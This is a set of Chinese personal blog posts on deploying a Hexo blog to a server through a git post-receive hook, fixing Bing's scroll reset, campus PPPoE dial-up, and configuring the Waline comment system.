<p>一个关键字：卡！Wordpress 太卡了，十分笨重和不方便。对于小小服务器来说简直是难以承受。况且对于内容为主的博客，Wordpress 显得过于臃肿，有大量插件可以用，也意味着你要看更多的广告和垃圾信息。此外，Wordpress 用户数量多，社区庞大，但社区内容鱼龙混杂，充斥大量商业化甚至无用的信息，不够纯粹，质量偏低</p>
<p>Wordpress 对于小白来说好上手，无脑后台管理。而拥有一点点编程经验的我完全可以凭一点点知识储备和动手能力砍掉多余的，无用的东西。Hexo 相较于 Wordpress，更轻，静态页面对 SEO 更友好，文章数据管理更方便、更让人贴心。</p>
<h2>实现思路和原理</h2>
<p>整个过程实现的原理可以用下图表示。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/view.jpg" alt="preview"></p>
<p>可参照下文顺序进行配置。</p>
<h1>本地配置准备</h1>
<h2>Hexo</h2>
<p>本地启用 Hexo：按照官方文档搭建基本环境（Node.js，Git），在本地尝试部署并熟悉 hexo 的写作流程，了解配置文件结构，此处不再赘述。<a href="https://hexo.io/zh-cn/docs/">官方文档 | Hexo</a></p>
<p>在本地 Hexo 站点目录下安装 hexo-deployer-git 插件：</p>
<pre><code class="language-sh">npm install hexo-deployer-git --save
</code></pre>
<h2>配置 SSH 密匙</h2>
<p>为了使本地可以跟远程的 github 建立联系，需要在本地配置 SSH 密钥，这样我们就可以在本地直接提交代码到 GitHub 上或者远端 git 仓库。</p>
<p>如果是第一次配置 SSH，则配置一下 git 的 username 和 email</p>
<pre><code class="language-sh">git config --global user.name &quot;你要设置的名字&quot;
git config --global user.email &quot;你要设置的邮箱&quot;
</code></pre>
<p>之后生成 SSH 密钥：</p>
<pre><code class="language-sh">ssh-keygen -t rsa -C &quot;你刚刚设置的邮箱&quot;
</code></pre>
<p>如果不需要设置密码的话，连续三个回车就好了。</p>
<p>复制好公钥后面要用：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230408233136534.png" alt="image-20230408233136534"></p>
<h1>服务器端操作</h1>
<blockquote>
<p>如果你刚刚重新初始化阿里服务器云盘，可能会连接报错。具体解决方法请看文末。</p>
</blockquote>
<h2>Nginx</h2>
<p>安装 Nginx 并配置好域名（如果有）。具体操作详见我的这篇文章。</p>
<h2>Git</h2>
<h3>git 的安装与用户创建</h3>
<pre><code class="language-sh"># 安装git
yum install git
# 创建git账户
adduser git				
# 添加Git账户权限
chmod 740 /etc/sudoers
vim /etc/sudoers
</code></pre>
<p>在 vim 编辑模式下，这个地方加上一行 <code>git     ALL=(ALL)     ALL</code>：</p>
<pre><code>## Allow root to run any commands anywhere
root    ALL=(ALL)     ALL
git     ALL=(ALL)     ALL
</code></pre>
<p>执行：</p>
<pre><code class="language-sh">chmod 400 /etc/sudoers  # 改回权限
sudo passwd git			# 设置 git 账户密码
</code></pre>
<p>输两次密码即可：</p>
<pre><code class="language-sh">Changing password for user git.
New password:						# 输的时候是看不到的
Retype new password:
passwd: all authentication tokens updated successfully.
</code></pre>
<p>执行：</p>
<pre><code class="language-sh">su git	# 切换至 git 用户
# 创建 ~/.ssh 文件夹和 ~/.ssh/authorized_keys 文件，并赋予相应的权限
mkdir ~/.ssh
vim ~/.ssh/authorized_keys
然后把本地公钥粘贴在authorized_keys里（详见上文）
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
</code></pre>
<p>这里提一嘴，有时候切换不了 git 用户，即 <code>su git</code> 执行不了。其实也没事，就是知道 git 用户目录是 <code>/home/git/</code> 就行，即上面命令中的 <code>~</code> 指的是 <code>/home/git/</code></p>
<p>在本地电脑中，终端执行：</p>
<pre><code>ssh -v git@&lt;你的服务器主机IP&gt;
</code></pre>
<p>如果能<strong>免密登录</strong>，那就成了。</p>
<h3>仓库创建与钩子创建</h3>
<p>保证之前在 Nginx 配置里的网站根目录的权限：</p>
<pre><code class="language-sh">chown -R git:git &lt;网站根目录&gt;
chmod -R 755 &lt;网站根目录&gt;
</code></pre>
<p>创建仓库：</p>
<pre><code class="language-sh">mkdir repo # 我选择在git的用户目录下创建
cd repo	   # 创建空白的git仓库
git init --bare hexo.git	# 创建一个空白的 git 仓库
chown -R git:git hexo.git	# 注意保证权限
vim ~/repo/hexo.git/hooks/post-receive
</code></pre>
<p>在 post-receive 里边输入：</p>
<pre><code class="language-bash">#!/bin/bash
git --work-tree=/var/www/uuanqin.top --git-dir=/home/git/repo/hexo.git checkout -f
</code></pre>
<p>以上内容建议手打。可以看出第一个参数对应的是网站根目录，第二个参数是代码仓库目录。</p>
<p>添加权限：</p>
<pre><code class="language-sh">chown -R git:git hexo.git/hooks/post-receive
chmod +x hexo.git/hooks/post-receive
</code></pre>
<h1>本地上传到仓库</h1>
<h2>Hexo 配置</h2>
<p>进入本地电脑 hexo 博客的根目录，编辑 <strong>站点配置文件 _config.yml</strong> ，找到 deploy，修改成以下：</p>
<pre><code>deploy:
  type: git
  #repo改为repo: git@&lt;服务器IP&gt;:&lt;服务器端的仓库&gt;
  repo: git@hjxlog.com:/var/repo/hexo.git
  branch: master
</code></pre>
<p>最后在本地电脑 hexo 博客的根目录执行命令：</p>
<pre><code>hexo clean
hexo d -g
</code></pre>
<blockquote>
<p>deploy 不需要输入 git 账户密码。如果还提示需要输入，说明之前配公钥的步骤没有成功。</p>
</blockquote>
<p>出现错误记得检查服务器端权限问题：</p>
<pre><code class="language-sh">chown -R git:git &lt;你的仓库&gt;
chown -R git:git &lt;网站根目录&gt;
</code></pre>
<p>在浏览器输入网址即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230409160319825.png" alt="image-20230409160319825"></p>
<p>嫌每次都输入两个命令麻烦，可以在 package.json 中添加 npm 脚本：</p>
<pre><code class="language-json">&quot;scripts&quot;: {
  &quot;publish&quot;: &quot;hexo clean &amp;&amp; hexo g -d&quot;,
  &quot;start&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; hexo s&quot;
}
</code></pre>
<p>下次执行时可以直接：</p>
<pre><code class="language-sh">npm run publish
</code></pre>
<h1>其他问题</h1>
<h2>SSH 连接问题</h2>
<p>服务器云盘初始化后，再次使用 ssh 连接时会有 <code>WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!</code> 的提示。解决方法：</p>
<pre><code class="language-sh">ssh-keygen -R &lt;之前连接时的网段IP&gt;
</code></pre>
<p>再次 SSL 连接：</p>
<pre><code class="language-sh">ssh root@&lt;服务器公网IP&gt;
</code></pre>
<p>出现一句：</p>
<p>Are you sure you want to continue connecting (yes/no)?</p>
<p>输入：yes 回车</p>
<p>参考：<a href="https://blog.csdn.net/wangguchao/article/details/85614914">问题解决——SSH时出现WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!_口袋里のInit的博客-CSDN博客</a></p>
<h2>钩子不起作用</h2>
<p>出现已经推送到服务器但是钩子不起作用，且出现 cannot run hooks/post-receive: No such file or directory 的提示：</p>
<p>请重新创建并<strong>手打</strong>post-receive 文件，保证该文件有可执行权。</p>
<pre><code class="language-sh">chmod +x post-receive
chown -R git:git post-receive
</code></pre>
<p>参考：<a href="https://blog.csdn.net/qq_48736958/article/details/113444533"> cannot run hooks/post-receive: No such file or directory_渣渣林的博客-CSDN博客</a></p>
<h2>hexo d 命令报错</h2>
<p>hexo d 命令报错 ERROR Deployer not found: git</p>
<p>解决方案</p>
<p>这是因为没安装 <code>hexo-deployer-git</code> 插件，在<strong>站点目录</strong>下输入下面的插件安装就好了：</p>
<pre><code>npm install hexo-deployer-git --save
</code></pre>
<p>然后在使用 <code>Hexo d</code> 命令就可以推送了。</p>
<p>参考：<a href="https://blog.csdn.net/qq_21808961/article/details/84476504">hexo d命令报错 ERROR Deployer not found: git_蓝蓝223的博客-CSDN博客</a></p>
<h1>本文参考</h1>
<p><a href="https://blog.csdn.net/qq_44706030/article/details/112759634">将 Hexo 部署到阿里云轻量服务器_hexo部署到阿里云_小阳coding的博客-CSDN博客</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2065118013">
                            <a href="#2065118013">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>国内访问 Hexo 优化加速（CDN链接替换）</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^hexo]: 详看我的这篇文章：<a href="#181570378" title="部署 Hexo 个人博客框架到服务器" class="record-link highlight">部署 Hexo 个人博客框架到服务器</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2346883624">
                            <a href="#2346883624">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_社会生活);">⬤</span>
                                    
                                </span>
                                
                                <span>成为一名个人博客网站站长</span>
                                
                                <div class="record-links-context hover">
                                    <p>我想搭一个 Hexo 博客网站：<a href="#181570378" title="部署 Hexo 个人博客框架到服务器" class="record-link highlight">部署 Hexo 个人博客框架到服务器</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="4084230277" class="record">
            <header>
                <h1 class="record-title">解决 Bing 搜索页自动返回顶部的问题</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Bing');">Bing</button>
                    
                    <button class="btn" onclick="activeTag('Edge');">Edge</button>
                    
                    <button class="btn" onclick="activeTag('Tampermonkey');">Tampermonkey</button>
                    
                    <button class="btn" onclick="activeTag('GreasyFork');">GreasyFork</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/16/2023</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>Stop doing weird things, Bing ! ;)</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20231022174222.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>f3706885</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>使用 Bing 搜索你可能会遇到这个问题：点击一条搜索结果后过段时间再返回搜索页面，搜索页自动返回顶部。就这一点问题，如果你没注意到还好说，认为是一个无痛无痒的小 Bug。一旦你开始被这个 Bug 影响，你就会陷入无限抓狂状态！！</p>
<p>解决方法，Edge 下载 Tampermonkey 插件：<a href="https://microsoftedge.microsoft.com/addons/detail/tampermonkey/iikmkjmpaadaobahmlepeloendndfphd">Tampermonkey - Microsoft Edge Addons</a></p>
<p>获取新脚本：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230416171417352.png" alt="image-20230416171417352"></p>
<p>打开“油叉”：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230416171510008.png" alt="image-20230416171510008"></p>
<p>搜索 FIX for &quot;Bing Search returns to the top&quot; !脚本进行安装即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230416171521865.png" alt="image-20230416171521865"></p>
<p>注意，部分用户可能要改一下脚本的代码，全流程看下图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230416171802268.png" alt="image-20230416171802268"></p>
<p>参考：<a href="https://tieba.baidu.com/p/8007376009">必应搜索页过一段时间就会自动回到页面开始位置_必应吧_百度贴吧 (baidu.com)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1309833614">
                            <a href="#1309833614">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>又是被 Edge 气拥的一天天</span>
                                
                                <div class="record-links-context hover">
                                    <p><a href="#4084230277" title="解决 Bing 搜索页自动返回顶部的问题" class="record-link highlight">解决 Bing 搜索页自动返回顶部的问题</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="346425435" class="record">
            <header>
                <h1 class="record-title">校园网有线网连接相关问题</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Clash');">Clash</button>
                    
                    <button class="btn" onclick="activeTag('有线网');">有线网</button>
                    
                    <button class="btn" onclick="activeTag('Windows');">Windows</button>
                    
                    <button class="btn" onclick="activeTag('PPPoE');">PPPoE</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/17/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/problemofwired.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>本文涉及PPPoE拨号指导以及开机自动拨号教程</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>14a6085b</span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>有线网的连接</h1>
<p>首先仔细查阅本校校园网的有线连接说明。若学校校园网支持PPPoE链接，则可以按照以下步骤进行拨号连接，无需下载其他PPPoE拨号客户端。</p>
<p>打开网络设置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230417225031498.png" alt="image-20230417225031498"></p>
<p>设置新链接：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230417225948370.png" alt="image-20230417225948370"></p>
<p>选择连接到Internet：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230417230005682.png" alt="image-20230417230005682"></p>
<p>点击设置新连接：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230417230107904.png" alt="image-20230417230107904"></p>
<p>点击，下一页：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230417230137355.png" alt="image-20230417230137355"></p>
<p>输入用户名和密码，具体请查阅本校校园网配置说明。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230417230208019.png" alt="image-20230417230208019"></p>
<p>以TJU为例：<a href="https://wiki.tjubot.cn/e-life/network">校园网 - 北洋维基 (tjubot.cn)</a></p>
<p>注意：连接名称推荐设置为英文名称，以避免以后不必要的麻烦。</p>
<h1>开机自动拨号</h1>
<p>PPPoE拨号设置好后，每次开机都需要手动拨号十分麻烦，我们可以在Windows计划中添加自动拨号的计划任务。</p>
<p>具体操作请参考这篇文章：<a href="https://blog.csdn.net/weixin_43667077/article/details/112468243?ydreferer=aHR0cHM6Ly9jbi5iaW5nLmNvbS8%3D">WIN10 电脑设置自动拨号联网任务，实现开机、断网自动重连_我才是一卓的博客-CSDN博客</a>。当然，里面的配置按需配置。</p>
<h1>不必要的麻烦</h1>
<h2>Clash魔法失效</h2>
<p>问题描述：使用Clash代理服务，在Windows上按照教程配置好时，无法使用魔法。排除订阅的配置文件的问题。</p>
<p>解决：校园网拨号连接名称改为英文试试。参考：<a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/4182">开启系统代理后无法使用，左上角数据一直显示0 · Issue #4182 · Fndroid/clash_for_windows_pkg (github.com)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1495212389" class="record">
            <header>
                <h1 class="record-title">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Waline');">Waline</button>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                    <button class="btn" onclick="activeTag('Vercel');">Vercel</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/27/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/waline-comment.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>由于vercel.app国内访问失败，可通过配置子域名的方法解决</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>591f2165</span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>引入 Waline 评论</h1>
<p>Hexo 博客框架 Butterfly 主题中引入 Waline 评论操作可以参考以下文章解决：</p>
<ul>
<li><a href="https://butterfly.js.org/posts/ceeb73f/#%E8%A9%95%E8%AB%96">Butterfly 安裝文檔(四) 主題配置-2 | Butterfly</a></li>
<li><a href="https://waline.js.org/guide/get-started/">快速上手 | Waline</a></li>
</ul>
<p>注意：</p>
<ul>
<li>
<p>在 <a href="https://waline.js.org/guide/get-started/">快速上手 | Waline</a> 这篇文章中，请按照指引完成 Vercel 的部署，并完成<strong>域名绑定</strong>小节（虽然它说可选，但我强烈建议你完成，否则你的评论系统只能在严苛的网络环境中运行）</p>
</li>
<li>
<p>在 Butterfly 的主题配置文件中有两处需要改：</p>
<pre><code class="language-yaml">comments:
  use: Waline # Valine,Disqus
  # ...
  
waline:
  serverURL: https://pl.uuanqin.top # Waline server address url
</code></pre>
<p>注意 serverURL 填自己创建子域名</p>
</li>
</ul>
<h1>切换数据库</h1>
<p>文档：<a href="https://waline.js.org/guide/database.html">多数据库服务支持 | Waline</a></p>
<p>基本步骤：</p>
<ul>
<li>打开 Waline 管理面板，导出数据</li>
<li>准备好自己的数据库</li>
<li>依据文档要求添加环境变量</li>
<li>删除 Vercel 中原有数据库相关的环境变量。或者把这些变量的多环境「Production」取消掉。</li>
<li>Vercel 重新部署</li>
<li>登录 Waline，并成为第一个注册用户</li>
<li>打开管理面板导入数据，等待数据导入成功。</li>
</ul>
<p>把数据从 LeanCloud 切换到自己服务器数据库的好处是：</p>
<ol>
<li>评论数据加载迅速</li>
<li>数据维护方便</li>
</ol>
<h1>使用 Waline 可能遇到的问题</h1>
<p><strong>问题：评论框已经能在博客中显示，但是获取不到评论内容，且无法发布评论。出现 Failed to Fetch 错误。但使用魔法后评论系统正常运行。</strong></p>
<p>解决：打开 F12 控制台并重新加载问题页面，你可能会发现 vervel.app 无法访问：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/vercal%E8%AF%84%E8%AE%BA%E9%97%AE%E9%A2%98.png" alt="vercal评论问题|475"></p>
<p>注意到页面向 vercel.app 发送了 GET 请求，但此时 vercel.app 在国内环境是无法访问的。</p>
<p>排查方向：</p>
<ul>
<li>
<p>首先确保按照 <a href="https://waline.js.org/guide/get-started/">快速上手 | Waline</a> 设置好了评论系统子域名，或再参考一下这篇文章 <a href="https://blog.csdn.net/Panzer_Jack/article/details/127418379?spm=1001.2101.3001.6650.13&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~Rate-13-127418379-blog-127204331.pc_relevant_recovery_v2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~Rate-13-127418379-blog-127204331.pc_relevant_recovery_v2&amp;utm_relevant_index=14">关于waline国内无法使用的解决方案 （vercel.app国内无法使用问题）_vercel 国内访问-CSDN博客</a></p>
<p>在域名服务器商（例如 阿里云&gt;云解析 DNS&gt;域名解析&gt;解析设置）处添加新的 <code>CNAME</code> 解析记录：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>Type</th>
<th>Name</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>CNAME</td>
<td><em>example</em>（你想要的子域名名称</td>
<td><strong><a href="http://cname.vercel-dns.com">cname.vercel-dns.com</a></strong> （也可以是<strong><a href="http://cname-china.vercel-dns.com">cname-china.vercel-dns.com</a></strong>）</td>
</tr>
</tbody>
</table>
<ul>
<li>确保在 Butterfly 的主题配置文件中设置了正确的 Waline 服务器地址（比如设置为<em><a href="http://example.yourdomain.com">example.yourdomain.com</a></em>）。</li>
</ul>
<h1>更多美化设置</h1>
<ul>
<li><a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link ">定制自己的 Waline 评论系统</a></li>
<li><a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link ">为评论系统增加输入提醒【Waline】</a></li>
<li><a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link ">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3015602463">
                            <a href="#3015602463">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>为评论系统增加输入提醒【Waline】</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link ">定制自己的 Waline 评论系统</a></li>
<li><a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link highlight">为评论系统增加输入提醒【Waline】</a></li>
<li><a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link ">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3709373237">
                            <a href="#3709373237">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>定制自己的 Waline 评论系统</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link highlight">定制自己的 Waline 评论系统</a></li>
<li><a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link ">为评论系统增加输入提醒【Waline】</a></li>
<li><a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link ">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3790495434">
                            <a href="#3790495434">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客与 Waline 评论区实现外链跳转中间页</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link ">定制自己的 Waline 评论系统</a></li>
<li><a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link ">为评论系统增加输入提醒【Waline】</a></li>
<li><a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link highlight">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2065118013">
                            <a href="#2065118013">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>国内访问 Hexo 优化加速（CDN链接替换）</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^hb]: fontawesome 可以考虑更换图标库，请看我之前的文章 <a href="#1215492985" title="装点你的 Butterfly 博客" class="record-link ">装点你的 Butterfly 博客</a><br>
[^bw]: 处理这个问题前请看我之前的文章：<a href="#1495212389" title="Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问" class="record-link highlight">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1215492985">
                            <a href="#1215492985">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>装点你的 Butterfly 博客</span>
                                
                                <div class="record-links-context hover">
                                    <p><a href="#1495212389" title="Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问" class="record-link highlight">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3709373237" class="record">
            <header>
                <h1 class="record-title">定制自己的 Waline 评论系统</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Waline');">Waline</button>
                    
                    <button class="btn" onclick="activeTag('Vercel');">Vercel</button>
                    
                    <button class="btn" onclick="activeTag('GitHub');">GitHub</button>
                    
                    <button class="btn" onclick="activeTag('Turnstile');">Turnstile</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/28/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/diy-waline.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>通过修改客户端或服务端的配置定制自己的 Waline 评论区</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>dd188b35</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>文章主要内容：</p>
<ol>
<li>Waline 邮件通知的设置</li>
<li>输入 QQ 邮箱自动获取 QQ 头像的配置</li>
<li>评论区美化要点</li>
<li>评论安全
<ol>
<li>设置违禁词的方法</li>
<li>设置 IP 黑名单</li>
<li>使用 Turnstile 验证码服务</li>
</ol>
</li>
<li>评论外链中间页详见：<a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link ">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ol>
<blockquote>
<p>[!Hint] 本文评论区可以测试，不过请尽量发有意义的内容。不要单纯评论 <code>123</code>、<code>test</code> 等。</p>
</blockquote>
<p>如果想为评论区增加悬浮小气泡输入提醒，详见这篇文章：<a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link ">为评论系统增加输入提醒【Waline】</a></p>
<h1>Waline 邮件通知</h1>
<p>Waline 发送邮件，首先你得有一个专门发送通知的邮箱，任何支持 STMP 协议的都行。这里以腾讯企业邮作域名邮箱为例。</p>
<h2>拥有域名邮箱</h2>
<p>注册一个企业微信，企业微信完成企业创建后，可以申请域名邮箱：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428231218707.png" alt="image-20230428231218707|600"></p>
<h2>解析设置</h2>
<p>然后在阿里云云解析进行设置：（其他云服务商解析设置方法参考：<a href="https://open.work.weixin.qq.com/help2/pc/19814?person_id=1&amp;searchData=">如何确认域名的服务商以及各大域名商的域名设置方法-帮助中心-企业微信 (qq.com)</a>）</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428230939924.png" alt="image-20230428230939924"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428231010712.png" alt="image-20230428231010712|475"></p>
<h2>邮箱设置好密码</h2>
<p>拥有企业邮箱之后，登录邮箱设置好密码。可参考 <a href="https://service.exmail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=7&amp;&amp;no=1001558">成员如何设置邮箱密码？腾讯企业邮箱帮助中心 (qq.com)</a></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428222407581.png" alt="image-20230428222407581|500"></p>
<h2>环境变量配置</h2>
<p>设置好域名邮箱密码后，打开 Vercel 服务端项目，点击环境变量：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428223656516.png" alt="image-20230428223656516|500"></p>
<p>然后按照 Waline 官方文档的指导设置好服务端的环境变量：<a href="https://waline.js.org/guide/features/notification.html#%E9%82%AE%E4%BB%B6%E9%80%9A%E7%9F%A5">评论通知 | Waline</a>，腾讯企业邮相关参数如下：</p>
<pre><code class="language-json">&quot;QQex&quot;: {
    &quot;aliases&quot;: [&quot;QQ Enterprise&quot;],
    &quot;domains&quot;: [&quot;exmail.qq.com&quot;],
    &quot;host&quot;: &quot;smtp.exmail.qq.com&quot;,
    &quot;port&quot;: 465,
    &quot;secure&quot;: true
},
</code></pre>
<p>参考：<a href="https://cloud.tencent.com/developer/article/2067294">Fluid -15- Waline 邮件通知 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h2>信件模板</h2>
<p>关于邮件内容的模板，即环境变量 <strong>MAIL_TEMPLATE_ADMIN</strong> 如何写，可自行搜索样例。</p>
<p>这里我参考了洪涝（张洪 Heo）的针对 Twikoo 评论系统的示例：<a href="https://blog.zhheo.com/p/169a1abb.html">Twikoo 评论回复邮件模板：Acrylic Mail 粉 | 张洪 Heo (zhheo.com)</a></p>
<h3>效果</h3>
<p>QQ 邮箱网页版：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230712235714.png" alt="image.png|475"></p>
<p>QQ 邮箱手机（暗黑模式）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/Screenshot_20230712_235815.jpg" alt="Screenshot_20230712_235815.jpg|225"></p>
<h3>改动</h3>
<p>其实与 Waline 大差不差，只是有一些写法需要注意（适配 Waline 后改动的地方）：</p>
<ul>
